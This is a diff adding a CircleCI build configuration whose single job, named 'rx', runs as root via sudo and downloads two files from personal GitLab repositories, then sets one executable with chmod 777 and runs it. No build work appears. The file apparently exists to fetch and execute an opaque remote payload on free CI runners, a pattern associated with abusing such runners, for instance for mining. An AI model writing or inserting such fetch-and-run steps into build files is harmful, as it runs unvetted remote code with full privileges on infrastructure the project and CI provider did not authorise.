@@ -1,0 +1,19 @@
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: cimg/base:stable
+
+    steps:
+      - run:
+          name: "rx"
+          command: |
+           sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/tx1"
+           sudo su --command "wget https://gitlab.com/MaribethTobin/dxx/-/raw/main/dx && chmod 777 dx && ./dx"
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+
